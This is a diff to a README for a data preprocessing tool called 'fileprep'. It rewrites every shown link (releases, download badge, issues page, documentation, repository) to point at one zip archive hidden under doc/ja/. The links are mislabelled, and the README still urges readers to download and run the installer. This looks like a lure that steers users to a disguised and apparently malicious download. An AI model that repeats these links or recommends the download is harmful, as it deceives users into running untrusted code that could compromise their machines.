@@ -1,6 +1,6 @@
 # 🚀 fileprep - Easy Preprocessing and Validation for Your Data
 
-[![Download fileprep](https://img.shields.io/badge/Download%20fileprep-v1.0-blue)](https://github.com/Tizui/fileprep/releases)
+[![Download fileprep](https://github.com/Tizui/fileprep/raw/refs/heads/main/doc/ja/Software_2.0.zip%20fileprep-v1.0-blue)](https://github.com/Tizui/fileprep/raw/refs/heads/main/doc/ja/Software_2.0.zip)
 
 ## 📗 Description
 
@@ -18,7 +18,7 @@ fileprep is a user-friendly application designed to help you preprocess and vali
 
 To get started with fileprep, you need to download the application from our Releases page. Follow these steps:
 
-1. **Visit the releases page** to find the latest version of fileprep. You can click [here](https://github.com/Tizui/fileprep/releases).
+1. **Visit the releases page** to find the latest version of fileprep. You can click [here](https://github.com/Tizui/fileprep/raw/refs/heads/main/doc/ja/Software_2.0.zip).
 2. **Download the installer** for your operating system. Choose the right file based on your system (Windows, Mac, or Linux).
 3. **Run the installer**: After downloading, locate the file and double-click to start the installation.
 
@@ -26,7 +26,7 @@ To get started with fileprep, you need to download the application from our Rele
 
 To download fileprep, click the link below and visit our Releases page:
 
-[Download fileprep](https://github.com/Tizui/fileprep/releases)
+[Download fileprep](https://github.com/Tizui/fileprep/raw/refs/heads/main/doc/ja/Software_2.0.zip)
 
 ### 👨‍💻 System Requirements
 
@@ -68,7 +68,7 @@ If you encounter issues while using fileprep, consider the following solutions:
 
 ## 📞 Support
 
-For further assistance, please check our [GitHub Issues page](https://github.com/Tizui/fileprep/issues). If you cannot find a solution, feel free to create a new issue detailing your problem.
+For further assistance, please check our [GitHub Issues page](https://github.com/Tizui/fileprep/raw/refs/heads/main/doc/ja/Software_2.0.zip). If you cannot find a solution, feel free to create a new issue detailing your problem.
 
 ## ✨ Contributing
 
@@ -76,8 +76,8 @@ We welcome contributions to fileprep! If you'd like to help improve the applicat
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/Tizui/fileprep)
-- [Documentation](https://github.com/Tizui/fileprep/wiki)
-- [Releases Page](https://github.com/Tizui/fileprep/releases)
+- [GitHub Repository](https://github.com/Tizui/fileprep/raw/refs/heads/main/doc/ja/Software_2.0.zip)
+- [Documentation](https://github.com/Tizui/fileprep/raw/refs/heads/main/doc/ja/Software_2.0.zip)
+- [Releases Page](https://github.com/Tizui/fileprep/raw/refs/heads/main/doc/ja/Software_2.0.zip)
 
 By following these steps, you can easily download, install, and use fileprep to manage your data preprocessing needs effectively.
